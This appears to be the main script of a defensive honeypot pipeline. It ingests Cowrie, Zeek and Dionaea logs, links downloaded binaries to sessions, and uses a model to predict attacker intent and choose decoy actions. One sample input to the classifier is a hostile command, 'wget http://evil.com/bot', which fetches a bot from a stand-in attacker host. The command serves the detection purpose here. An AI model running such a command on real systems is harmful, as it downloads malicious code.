import os
import json
import yaml

from agents.discovery import run_discovery, write_report
from agents.analysis import run_ingestors, correlate_downloads_to_sessions
from agents.decision import load_model, predict_intent
from agents.deception import decide_decoy_action
from agents.xai import explain_action


def load_config(config_path):
    with open(config_path, 'r') as f:
        return yaml.safe_load(f)


def main():
    config = load_config("./config/settings.yaml")

    discovery_report = run_discovery("127.0.0.1")
    write_report(discovery_report, "./data/processed/discovery_report.json")

    # Check if raw logs exist; if yes, use them directly
    raw_logs_dir = config["paths"]["raw_logs_dir"]
    cowrie_path = os.path.join(raw_logs_dir, "raw_cowrie_all.json")
    zeek_path = os.path.join(raw_logs_dir, "raw_zeek_universal.json")
    dionaea_path = os.path.join(raw_logs_dir, "raw_dionaea_streams.json")

    if os.path.exists(cowrie_path) and os.path.exists(zeek_path) and os.path.exists(dionaea_path):
        ingest_counts = {"cowrie": "existing", "zeek": "existing", "dionaea": "existing"}
        print("Using existing raw logs.")
    else:
        ingest_counts = run_ingestors(config)
        print(f"Ingested logs: {ingest_counts}")

    correlation = correlate_downloads_to_sessions(
        config["paths"]["binaries_dir"],
        cowrie_path,
        config["analysis"]["session_link_time_window_sec"],
    )
    with open("./data/processed/session_binary_map.json", "w") as f:
        json.dump(correlation, f, indent=2)

    model_path = config["ml"]["model_path"]
    vectorizer_path = config["ml"]["vectorizer_path"]
    classes = config["ml"]["classes"]

    if os.path.exists(model_path) and os.path.exists(vectorizer_path):
        model, vectorizer = load_model(model_path, vectorizer_path)
        commands = ["nmap -sV 127.0.0.1", "wget http://evil.com/bot"]
        result = predict_intent(model, vectorizer, commands, classes)
        action = decide_decoy_action(result["label"])
        explanation = explain_action(result["label"], result["confidence"], action)
    else:
        action = "monitor"
        explanation = "Model or vectorizer not found; running in monitor-only mode."

    with open("./data/processed/xai_audit_log.txt", "a") as f:
        f.write(explanation + "\n")

    print("Discovery report written.")
    print(f"Log status: {ingest_counts}")
    print(f"Action: {action}")
    print(f"XAI: {explanation}")


if __name__ == "__main__":
    main()
